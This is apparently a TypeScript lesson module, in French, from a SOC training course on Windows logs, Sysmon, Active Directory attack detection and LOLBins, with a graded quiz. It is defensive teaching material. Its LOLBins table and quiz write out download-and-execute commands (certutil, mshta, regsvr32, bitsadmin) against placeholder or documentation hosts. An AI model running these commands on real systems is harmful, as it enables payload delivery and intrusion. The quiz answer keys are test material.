import type { Module } from '../../types'
import { code, danger, h, info, p, r, table, tip, ul, warn } from '../blocks'

export const m2: Module = {
  id: 'windows-ad',
  number: 2,
  title: 'Logs Windows, Active Directory et endpoint (EDR)',
  tier: 'N1-N2',
  summary:
    "Les Event IDs et les événements Sysmon à connaître par cœur, les attaques Active Directory les plus fréquentes et la lecture d'une lignée de processus.",
  objectives: [
    'Lire un `4624` et en déduire le type de connexion',
    'Repérer la persistance via les événements de comptes, de services et de tâches',
    'Exploiter Sysmon pour reconstruire une exécution',
    'Détecter Kerberoasting, AS-REP Roasting, Pass-the-Hash et DCSync',
    'Identifier une lignée de processus anormale et les LOLBins',
  ],
  sections: [
    {
      id: 'auth',
      title: 'Authentification : 4624, 4625, 4648, 4672',
      blocks: [
        table(
          ['Event ID', 'Signification', 'Où', 'Champs à regarder'],
          ['`4624`', 'Ouverture de session réussie', 'Machine cible', '`LogonType`, `IpAddress`, `WorkstationName`, `AuthenticationPackageName`'],
          ['`4625`', 'Échec de connexion', 'Machine cible', '`Status`, `SubStatus`, `IpAddress`, `TargetUserName`'],
          ['`4648`', 'Connexion avec identifiants explicites (`runas`, PsExec avec `-u`)', 'Machine source', '`SubjectUserName`, `TargetUserName`, `TargetServerName`'],
          ['`4672`', 'Privilèges spéciaux attribués à la session', 'Machine cible', '`SubjectUserName`, `PrivilegeList`'],
        ),
        h('Les Logon Types à connaître'),
        table(
          ['Type', 'Nom', 'Exemple', 'Ce qui doit alerter'],
          ['`2`', 'Interactive', 'Session au clavier', 'Compte de service en connexion interactive'],
          ['`3`', 'Network', 'Accès SMB, `net use`, PsExec', 'Un poste qui se connecte à de nombreux autres postes'],
          ['`7`', 'Unlock', 'Déverrouillage', 'Déverrouillage à une heure où le salarié est absent'],
          ['`10`', 'RemoteInteractive', 'RDP', 'RDP depuis un poste utilisateur ou une IP externe'],
          ['`4`', 'Batch', 'Tâche planifiée', 'Nouveau compte dans ce contexte'],
          ['`5`', 'Service', 'Démarrage de service', 'Service exécuté par un compte humain'],
          ['`8`', 'NetworkCleartext', 'IIS Basic, certains scripts', 'Mot de passe transmis en clair'],
          ['`9`', 'NewCredentials', '`runas /netonly`', 'Avec package `seclogo` : signature classique de Pass-the-Hash via Mimikatz'],
        ),
        h('Codes d’échec du 4625'),
        table(
          ['SubStatus', 'Signification', 'Lecture SOC'],
          ['`0xC0000064`', "Le compte n'existe pas", 'Énumération ou spraying avec une liste de noms'],
          ['`0xC000006A`', 'Mauvais mot de passe', 'Brute-force si répété sur un compte'],
          ['`0xC0000234`', 'Compte verrouillé', 'Conséquence d’un brute-force'],
          ['`0xC0000072`', 'Compte désactivé', 'Tentative sur un ancien compte'],
          ['`0xC000006F`', 'Hors plage horaire autorisée', 'Rare, à vérifier'],
          ['`0xC0000071`', 'Mot de passe expiré', 'Souvent un script ou un service oublié'],
        ),
        code('log', '4624 + 4672 : session administrateur par le réseau', r`
EventID=4624 Computer=FILESRV01 LogonType=3 TargetUserName=adm.dupont IpAddress=10.20.4.42
  AuthenticationPackageName=NTLM WorkstationName=FIN-PC-042 LmPackageName="NTLM V2"
EventID=4672 Computer=FILESRV01 SubjectUserName=adm.dupont
  PrivilegeList=SeDebugPrivilege SeBackupPrivilege SeTcbPrivilege
`),
        warn('Pièges de faux positifs', "Le compte `SYSTEM`, les `DWM-*` et les `UMFD-*` génèrent des `4624` en masse : filtrez-les. Sur un contrôleur de domaine, les comptes machine (`PC-42$`) produisent un flot constant de type 3 sans gravité. Un `4625` à répétition vient très souvent d'un service ou d'un téléphone avec un ancien mot de passe : regardez `IpAddress` et `ProcessName` avant de crier à l'attaque."),
      ],
    },
    {
      id: 'persistance',
      title: 'Persistance et comptes',
      blocks: [
        table(
          ['Event ID', 'Signification', 'Journal', 'Lecture SOC'],
          ['`4720`', 'Compte utilisateur créé', 'Security', 'Vérifiez le ticket et le créateur'],
          ['`4722`', 'Compte activé', 'Security', 'Suit souvent un `4720`'],
          ['`4728`', "Ajout à un groupe **global** de sécurité (ex. Domain Admins)", 'Security', 'Critique pour les groupes à privilèges du domaine'],
          ['`4732`', "Ajout à un groupe **local** de sécurité (ex. Administrateurs)", 'Security', 'Critique si le groupe est privilégié'],
          ['`4756`', 'Ajout à un groupe **universel** (ex. Enterprise Admins)', 'Security', 'Critique : niveau forêt'],
          ['`4697`', 'Service installé', 'Security', 'Binaire dans `C:\\Users\\` ou `C:\\Windows\\Temp\\`'],
          ['`7045`', 'Service installé', 'System', 'Exemple : `PSEXESVC`, nom aléatoire, chemin `cmd /c`'],
          ['`4698`', 'Tâche planifiée créée', 'Security', 'Le champ `TaskContent` contient le XML complet'],
          ['`4702`', 'Tâche planifiée modifiée', 'Security', 'Détournement d’une tâche existante'],
          ['`1102`', 'Journal Security effacé', 'Security', 'Presque toujours critique'],
          ['`104`', 'Journal effacé (autres journaux)', 'System', 'Idem'],
        ),
        info('Une précision souvent oubliée', "`4732` ne couvre que les groupes de domaine **locaux**. Un ajout à `Domain Admins` (groupe global) lève un `4728`, et à `Enterprise Admins` (universel) un `4756`. Une règle qui ne surveille que `4732` laisse passer l'ajout le plus dangereux."),
        code('kql', 'KQL : ajout à un groupe à privilèges', r`
SecurityEvent
| where EventID in (4728, 4732, 4756)
| where TargetUserName in ("Domain Admins", "Enterprise Admins", "Administrators", "Administrateurs", "Admins du domaine")
| project TimeGenerated, Computer, Activity, Actor = SubjectUserName, MemberName, Group = TargetUserName
`),
        code('spl', 'SPL : services installés hors chemin habituel', r`
index=wineventlog EventCode=7045 NOT (Service_File_Name="*\\Windows\\System32\\*" OR Service_File_Name="*\\Program Files*")
| table _time host Service_Name Service_File_Name Service_Account
`),
      ],
    },
    {
      id: 'sysmon',
      title: 'Exécution et Sysmon',
      blocks: [
        p("Sysmon est un service gratuit de Sysinternals qui journalise bien plus finement que le journal Security. Sans configuration (par exemple celle de SwiftOnSecurity ou d'Olaf Hartong), il génère peu de données utiles : vérifiez ce qui est réellement collecté."),
        table(
          ['ID', 'Événement', 'Champs clés', 'Détection type'],
          ['`1`', 'Création de processus', '`Image`, `CommandLine`, `ParentImage`, `Hashes`, `User`', 'Lignée anormale, LOLBins'],
          ['`3`', 'Connexion réseau', '`Image`, `DestinationIp`, `DestinationPort`', '`rundll32.exe` qui sort sur Internet'],
          ['`7`', 'Image chargée', '`ImageLoaded`, `Signed`, `Signature`', 'DLL sideloading : DLL non signée à côté d’un binaire signé'],
          ['`8`', 'CreateRemoteThread', '`SourceImage`, `TargetImage`, `StartFunction`', 'Injection de code'],
          ['`10`', 'ProcessAccess', '`SourceImage`, `TargetImage`, `GrantedAccess`', '`TargetImage=lsass.exe`, `GrantedAccess=0x1010`'],
          ['`11`', 'Création de fichier', '`TargetFilename`, `Image`', 'Exécutable dans `Temp`, dossier Startup'],
          ['`12/13`', 'Clé créée / valeur modifiée', '`TargetObject`, `Details`', 'Clés `...\\CurrentVersion\\Run`'],
          ['`22`', 'Requête DNS', '`QueryName`, `Image`', 'Domaine récent demandé par un processus inattendu'],
        ),
        h('Vol d’identifiants via LSASS : lire GrantedAccess'),
        table(
          ['GrantedAccess', 'Lecture'],
          ['`0x1010`', 'PROCESS_QUERY_LIMITED_INFORMATION + PROCESS_VM_READ : signature classique de `sekurlsa::logonpasswords`'],
          ['`0x1410`', 'PROCESS_QUERY_INFORMATION + PROCESS_VM_READ : outils de dump, Mimikatz selon le module'],
          ['`0x1fffff`', 'PROCESS_ALL_ACCESS : très intrusif, à analyser selon la source'],
        ),
        code('log', 'Sysmon 10 : accès à LSASS', r`
EventID=10 SourceImage=C:\Users\Public\svc.exe TargetImage=C:\Windows\System32\lsass.exe
  GrantedAccess=0x1010 CallTrace=C:\Windows\SYSTEM32\ntdll.dll+9d4c4|UNKNOWN(00007FF8A1C2)
`),
        warn('Pièges de faux positifs', "Les antivirus, EDR et agents de supervision lisent LSASS en permanence. Filtrez par chemin **et** signature, pas seulement par nom : un attaquant peut nommer son binaire `MsMpEng.exe`. Un `UNKNOWN` dans `CallTrace` indique en revanche souvent du code non adossé à un module, ce qui est très suspect."),
      ],
    },
    {
      id: 'ad',
      title: 'Attaques Active Directory',
      blocks: [
        table(
          ['Attaque', 'Principe', 'Événement', 'Indicateur'],
          ['Kerberoasting (`T1558.003`)', 'Demander un ticket de service puis casser hors ligne le mot de passe du compte de service', '`4769` sur le DC', '`TicketEncryptionType=0x17` (RC4) et rafale de SPN distincts par un même compte'],
          ['AS-REP Roasting (`T1558.004`)', 'Récupérer un AS-REP pour les comptes sans pré-authentification', '`4768` sur le DC', '`PreAuthType=0` et chiffrement `0x17`'],
          ['Pass-the-Hash (`T1550.002`)', "Réutiliser le hash NTLM sans connaître le mot de passe", '`4624`, Sysmon 10 sur la source', 'Type 3 NTLM inhabituel, ou type 9 avec `seclogo` sur la source'],
          ['DCSync (`T1003.006`)', "Se faire passer pour un DC et demander la réplication des secrets", '`4662` sur le DC', 'Droits de réplication demandés par un compte qui n’est pas un DC'],
        ),
        h('Kerberoasting en détail'),
        code('kql', 'KQL : plusieurs SPN en RC4 par compte', r`
SecurityEvent
| where EventID == 4769
| parse EventData with * 'TargetUserName">' User '<' * 'ServiceName">' Service '<' * 'TicketEncryptionType">' Enc '<' *
| where Enc == "0x17" and Service !endswith "$" and Service != "krbtgt"
| summarize Services = dcount(Service), List = make_set(Service, 20) by User, bin(TimeGenerated, 10m)
| where Services > 5
`),
        code('spl', 'SPL : équivalent', r`
index=wineventlog EventCode=4769 Ticket_Encryption_Type=0x17 Service_Name!="*$" Service_Name!="krbtgt"
| bin _time span=10m
| stats dc(Service_Name) as spn_count values(Service_Name) as spns by _time Account_Name Client_Address
| where spn_count > 5
`),
        warn('Le RC4 n’est pas toujours une attaque', "D'anciennes applications ou des comptes sans AES configuré demandent encore du RC4. L'indicateur le plus fiable est le **volume** : un même compte qui demande de nombreux SPN distincts en peu de temps. Attention aussi aux outils récents qui évitent le RC4 : un Kerberoasting en AES (`0x12`) existe, d'où l'intérêt de surveiller aussi le nombre de SPN."),
        h('DCSync : les GUID à retenir'),
        table(
          ['GUID dans 4662', 'Droit'],
          ['`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`', 'DS-Replication-Get-Changes'],
          ['`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`', 'DS-Replication-Get-Changes-All'],
          ['`89e95b76-444d-4c62-991a-0facbeda640c`', 'DS-Replication-Get-Changes-In-Filtered-Set'],
        ),
        code('spl', 'SPL : réplication demandée par autre chose qu’un DC', r`
index=wineventlog EventCode=4662 Access_Mask=0x100
  (Properties="*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*" OR Properties="*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*")
  Account_Name!="*$"
| table _time host Account_Name Properties
`),
        danger('Conséquence d’un DCSync confirmé', "L'attaquant dispose potentiellement de tous les hash du domaine, y compris `krbtgt`. La remédiation implique une double réinitialisation de `krbtgt`, espacée d'au moins le temps de réplication et de la durée de vie des tickets, ainsi que le renouvellement des comptes à privilèges. Cela relève de la cellule de crise, pas d'une simple clôture."),
        info('Faux positifs DCSync', "Azure AD Connect (`MSOL_*`) et certains outils de sauvegarde ou d'audit ont légitimement ces droits. Maintenez une liste d'exceptions explicite et vérifiez que le compte n'est utilisé que depuis son serveur habituel."),
      ],
    },
    {
      id: 'process-tree',
      title: 'Lignée de processus et LOLBins',
      blocks: [
        p("Un processus n'est pas suspect en lui-même : `powershell.exe` est présent sur tous les postes. C'est son parent, sa ligne de commande et ce qu'il fait ensuite qui racontent l'histoire."),
        code('text', 'Lignée typique d’une macro malveillante', r`
explorer.exe
└─ WINWORD.EXE "C:\Users\j.martin\Downloads\Facture_0342.docm"
   └─ cmd.exe /c powershell -nop -w hidden -enc SQBFAFgA...
      └─ powershell.exe -nop -w hidden -enc SQBFAFgA...
         ├─ whoami.exe /all
         └─ rundll32.exe C:\Users\Public\update.dll,Start
`),
        table(
          ['Parent', 'Enfant', 'Pourquoi c’est anormal'],
          ['`WINWORD.EXE`, `EXCEL.EXE`, `OUTLOOK.EXE`', '`cmd.exe`, `powershell.exe`, `mshta.exe`, `wscript.exe`', 'Un traitement de texte ne lance pas de shell'],
          ['`w3wp.exe`, `httpd`, `tomcat`', '`cmd.exe`, `whoami`, `sh`', 'Signe classique de web shell'],
          ['`services.exe`', 'Autre chose que des binaires de service', 'Service malveillant'],
          ['`svchost.exe`', 'Parent différent de `services.exe`', 'Faux `svchost` : le vrai est lancé par `services.exe`'],
          ['`lsass.exe`', 'Tout enfant', 'LSASS ne lance quasiment jamais de processus'],
        ),
        h('Options PowerShell à repérer'),
        table(
          ['Option', 'Effet', 'Note'],
          ['`-nop`', 'Ne charge pas le profil', 'Peu significatif seul'],
          ['`-w hidden`', 'Fenêtre masquée', 'Très suspect avec un parent Office'],
          ['`-enc` / `-e` / `-ec`', 'Commande en Base64 (UTF-16LE)', 'PowerShell accepte toute abréviation non ambiguë'],
          ['`-ep bypass`', 'Contourne la politique d’exécution', 'Fréquent aussi dans les scripts d’admin'],
          ['`IEX` + `DownloadString`', 'Exécute en mémoire un script distant', 'Peu de traces sur disque'],
        ),
        h('Les LOLBins à connaître'),
        table(
          ['Binaire', 'Abus', 'Commande typique'],
          ['`certutil.exe`', 'Téléchargement, décodage', '`certutil -urlcache -split -f http://x/a.exe a.exe`'],
          ['`rundll32.exe`', 'Exécution de DLL ou de script', '`rundll32 C:\\Users\\Public\\a.dll,Start`'],
          ['`mshta.exe`', 'Exécution de HTA distant', '`mshta http://x/a.hta`'],
          ['`regsvr32.exe`', 'Technique Squiblydoo', '`regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll`'],
          ['`wmic.exe`', 'Exécution distante', '`wmic /node:SRV process call create "cmd /c ..."`'],
          ['`bitsadmin.exe`', 'Téléchargement', '`bitsadmin /transfer j http://x/a.exe C:\\a.exe`'],
        ),
        tip('Le réflexe', "Face à un binaire inconnu ou à un usage étrange, consultez LOLBAS (`lolbas-project.github.io`) pour Windows et GTFOBins (`gtfobins.github.io`) pour Linux."),
      ],
    },
  ],
  cheatSheet: [
    table(
      ['ID', 'À retenir'],
      ['`4624` / `4625`', 'Succès / échec de connexion. Regardez `LogonType`, `IpAddress`, `SubStatus`'],
      ['`4648`', 'Identifiants explicites : visible sur la machine source'],
      ['`4672`', 'Session à privilèges spéciaux'],
      ['`4720` / `4728` / `4732` / `4756`', 'Compte créé / ajout groupe global / local / universel'],
      ['`4697` / `7045` / `4698`', 'Service (Security / System) / tâche planifiée'],
      ['`4768` / `4769`', 'TGT / TGS. `0x17` = RC4'],
      ['`4662`', 'Accès à un objet AD : GUID de réplication = DCSync'],
      ['`1102`', 'Journal Security effacé'],
      ['Sysmon `1` / `3` / `7` / `8` / `10`', 'Processus / réseau / DLL / injection / accès mémoire'],
      ['Sysmon `11` / `12-13` / `22`', 'Fichier / registre / DNS'],
    ),
    code('powershell', 'Commandes de terrain', r`
# 50 derniers échecs de connexion
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 50

# Services installés, 7 derniers jours
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045; StartTime=(Get-Date).AddDays(-7)}

# Tâches planifiées hors dossier Microsoft
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' }

# Clés Run
Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run','HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'

# Empreinte d'un fichier
Get-FileHash C:\Users\Public\svc.exe -Algorithm SHA256
`),
    ul('Toujours en lecture seule sur un hôte à investiguer : préférez les actions de réponse de l’EDR ou Velociraptor pour éviter de polluer les preuves.'),
  ],
  quiz: [
    {
      q: 'Analysez cet événement. Que s’est-il passé ?',
      evidence: { lang: 'log', code: 'EventID=4624 Computer=SRV-APP01 LogonType=10 TargetUserName=adm.martin IpAddress=10.20.8.77' },
      options: ['Déverrouillage local de la session de adm.martin sur sa propre console physique', 'Connexion RDP de adm.martin depuis 10.20.8.77', 'Accès à un partage SMB', 'Tâche planifiée'],
      answer: 1,
      explain: 'Le type 10 correspond à RemoteInteractive, donc RDP. Vérifiez ensuite si 10.20.8.77 est bien un bastion ou un poste d’administration.',
    },
    {
      q: 'Quel événement indique le mieux un Kerberoasting ?',
      evidence: { lang: 'log', code: 'EventID=4769 TargetUserName=j.martin ServiceName=svc-sql TicketEncryptionType=0x17 (+ 37 autres SPN en 2 minutes)' },
      options: ['Une rafale de 4769 en RC4 vers de nombreux SPN', 'Un 4625 unique', 'Un 7045', 'Un 4672'],
      answer: 0,
      explain: "Un utilisateur classique ne demande pas des dizaines de tickets de service différents en RC4 en deux minutes. L'indicateur clé est le volume de SPN distincts associé au chiffrement faible.",
    },
    {
      q: 'Un membre est ajouté à « Domain Admins ». Quel événement est levé ?',
      options: ['4720', '4732', '4728', '4698'],
      answer: 2,
      explain: "`Domain Admins` est un groupe global : c'est `4728`. `4732` concerne les groupes locaux, et `4756` les groupes universels.",
    },
    {
      q: 'Cet accès à LSASS est-il préoccupant ?',
      evidence: { lang: 'log', code: 'EventID=10 SourceImage=C:\\Users\\Public\\svc.exe TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1010' },
      options: [
        'Non, tous les processus lisent LSASS',
        'Oui : binaire dans Public avec les droits de lecture mémoire typiques d’un dump d’identifiants',
        'Non, 0x1010 signifie accès refusé',
        'Oui, mais uniquement si le poste est un contrôleur de domaine, car LSASS n’existe pas sur les postes de travail',
      ],
      answer: 1,
      explain: "`0x1010` combine requête limitée et lecture mémoire. Un binaire non signé dans `C:\\Users\\Public` n'a aucune raison de lire LSASS.",
    },
    {
      q: 'Quelle lignée est la plus suspecte ?',
      options: ['`explorer.exe` → `WINWORD.EXE`', '`services.exe` → `svchost.exe`', '`w3wp.exe` → `cmd.exe` → `whoami.exe`', '`explorer.exe` → `chrome.exe`'],
      answer: 2,
      explain: 'Un processus IIS qui lance un shell puis une commande de reconnaissance est le signe typique d’un web shell.',
    },
    {
      q: 'Que recherche-t-on dans un 4662 pour détecter un DCSync ?',
      options: [
        'Un `LogonType` égal à 3',
        'Les GUID de réplication demandés par un compte qui n’est pas un contrôleur de domaine',
        'Le chiffrement `0x17`',
        'Le SubStatus `0xC000006A` renvoyé lorsqu’un compte de service échoue à ouvrir une session de réplication',
      ],
      answer: 1,
      explain: "Seuls les DC et quelques comptes explicitement autorisés (Azure AD Connect notamment) doivent répliquer. Un compte utilisateur qui demande ces droits est critique.",
    },
    {
      q: "Une rafale de 4625 avec `SubStatus=0xC0000064` sur des centaines de noms différents, depuis une seule IP. Qu'est-ce que cela suggère ?",
      options: ['Un service mal configuré', 'Une énumération ou un spraying avec une liste de noms', 'Un compte verrouillé', 'Une expiration de mot de passe sur des comptes restés inactifs pendant plusieurs mois'],
      answer: 1,
      explain: "`0xC0000064` indique que le compte n'existe pas : l'attaquant teste une liste de noms supposés.",
    },
    {
      q: 'Quel binaire légitime est abusé dans cette commande ?',
      evidence: { lang: 'log', code: 'CommandLine="certutil.exe -urlcache -split -f http://203.0.113.50/a.exe C:\\Users\\Public\\a.exe"' },
      options: ['Il s’agit d’un binaire malveillant qui imite le nom d’un outil Microsoft, à supprimer du poste', 'certutil, un LOLBin utilisé ici pour télécharger un fichier', 'rundll32', 'mshta'],
      answer: 1,
      explain: "`certutil` est un outil Windows signé pour gérer les certificats. `-urlcache -split -f` détourne sa fonction de cache pour télécharger une charge.",
    },
  ],
}
